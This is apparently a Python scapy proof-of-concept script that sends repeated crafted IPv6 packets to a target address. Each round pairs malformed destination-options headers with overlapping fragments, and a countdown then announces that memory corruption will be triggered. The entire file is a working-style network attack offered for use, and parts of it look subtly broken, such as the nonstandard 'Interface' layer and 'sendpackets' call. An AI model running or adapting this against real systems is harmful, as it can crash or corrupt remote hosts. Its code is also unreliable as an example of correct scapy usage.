import argparse
from scapy.all import *
import time

parser = argparse.ArgumentParser(description="'IPv6 Vulnerability Simulation Script by w01f.")
parser.add_argument("--iface", type=str, required=True, help="Network interface(s) to use for sending packets, comma-separated for multiple.")
parser.add_argument("--ipv6", type=str, required=True, help="Destination IP address.")
parser.add_argument("--mac_addr", type=str, default='', help="Destination MAC address (optional).")
parser.add_argument("--num_tries", type=int, default=20, help="Number of tries per batch.")
parser.add_argument("--num_batches", type=int, default=20, help="Number of batches of tries.")
args = parser.parse_args()


ifaces = args.iface.split(',')
ipv6 = args.ipv6
mac_addr = args.mac_addr
num_tries = args.num_tries
num_batches = args.num_batches


def get_packets_with_mac(i):

    frag_id = 0xdebac1e + i

    first = Interface(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = Interface(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m = 1, offset = 0) / 'aaaaaaaa'
    third = Interface(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m = 0, offset = 1)
    return [first, second, third]

def get_packets(i):
    if mac_addr != '':

        return get_packets_with_mac(i)
    frag_id = 0xdebac1e + i

    first = IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m = 1, offset = 0) / 'aaaaaaaa'
    third = IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m = 0, offset = 1)
    return [first, second, third]
final_ps = []
for _ in range(num_batches):
    for i in range(num_tries):
        final_ps += get_packets(i) + get_packets(i)
print("Sending packets")
for iface in ifaces:
    if mac_addr != '':
        sendpackets(final_ps, iface=iface)
    else:
        send(final_ps, iface=iface)
for i in range(60):
    print(f"Memory corruption will be triggered in {60-i} seconds", end='\r')
    time.sleep(1)
print("")